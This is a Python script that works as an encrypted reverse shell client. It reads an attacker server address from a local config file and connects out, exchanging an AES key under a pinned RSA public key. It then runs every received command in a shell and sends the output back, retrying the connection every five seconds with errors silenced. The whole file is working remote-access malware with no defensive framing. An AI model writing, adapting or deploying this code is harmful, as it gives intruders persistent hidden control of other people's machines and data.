#!/usr/bin/env python3
import socket
import subprocess
import json
import time
import os
import cryptography
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.hashes import SHA256, Hash
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat, load_der_public_key
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as p

SERVER_IP = ""
SERVER_PORT = 0
BUFFER_SIZE = 4096

DEBUG_ENCRYPTION = False 
ENCRYPT_DATA = True 
BLOCK_SIZE_BYTES = 16 # for AES
SYM_KEY = os.urandom(32) 
pad = p.PKCS7(BLOCK_SIZE_BYTES * 8)

def encrypt(data: str) -> bytes:
  iv = os.urandom(BLOCK_SIZE_BYTES)
  encryptor = Cipher(
    algorithms.AES(SYM_KEY),
    modes.CBC(iv)
  ).encryptor()

  padder = pad.padder()
  data = padder.update(data) + padder.finalize()
  
  return iv + encryptor.update(data) + encryptor.finalize()

def decrypt(data: bytes) -> bytes:
  iv = data[:16]
  data = data[16:]

  decryptor = Cipher(
    algorithms.AES(SYM_KEY),
    modes.CBC(iv)
  ).decryptor()

  data = decryptor.update(data) + decryptor.finalize()

  unpadder = p.PKCS7(128).unpadder()
  data = unpadder.update(data) + unpadder.finalize()
  return data


def key_exchange(conn):
  pub_key = conn.recv(BUFFER_SIZE)

  expected_digest = b'\x08r\xfc\x99oq\x14`\x8b\xbf{\xbfv\x0130l(k@\xf1\xa6+P3\x8b\x18\x06\x7f\xc4[\xee'

  digest = Hash(SHA256())
  digest.update(pub_key)
  digest = digest.finalize()
  if not digest == expected_digest:
    print("Key exchange failed!")
    exit()

  pub_key = load_der_public_key(pub_key)
  encrypted_sym_key = pub_key.encrypt(
    SYM_KEY, 
    padding.OAEP(
      mgf=padding.MGF1(algorithm=cryptography.hazmat.primitives.hashes.SHA256()), 
      algorithm=SHA256(), 
      label=None
    )
  )
  conn.send(encrypted_sym_key)

def read_conf():
  with open(os.path.join(os.path.dirname(os.path.realpath(__file__)), "cconf"), "r") as f:
    global SERVER_IP
    global SERVER_PORT
    opts = f.read().split("\n")
    for opt in opts:
      if opt.startswith("SERVER_IP"):
        SERVER_IP = opt.split("=")[1].strip()
      elif opt.startswith("SERVER_PORT"):
        SERVER_PORT = int(opt.split("=")[1].strip())

def decode_subprocess_output(output):
  return json.dumps({
    "stdout": output.stdout.decode(),
    "stderr": output.stderr.decode()
  })

def get_command(socket) -> str:
  data = socket.recv(BUFFER_SIZE)
  if DEBUG_ENCRYPTION:
    print("received", data)
  if ENCRYPT_DATA:
    data = decrypt(data)
  data = data.decode()
  return json.loads(data)["command"]

def send_result(socket, result: str):
  result = result.encode()
  if ENCRYPT_DATA:
    result = encrypt(result)
  socket.send(result)

def communication_loop(s):
  if ENCRYPT_DATA:
    key_exchange(s)

  while True:
    # get response, which is a command that sho=uld be executed in shell
    command = get_command(s)
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    result = decode_subprocess_output(result)
    # send back output to server
    send_result(s, result)

def connection_loop():
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((SERVER_IP, SERVER_PORT))
      communication_loop(s)
    except:
      if s:
        try:
          s.close()
        except:
          pass
      time.sleep(5)

if __name__ == "__main__":
  read_conf()
  connection_loop()
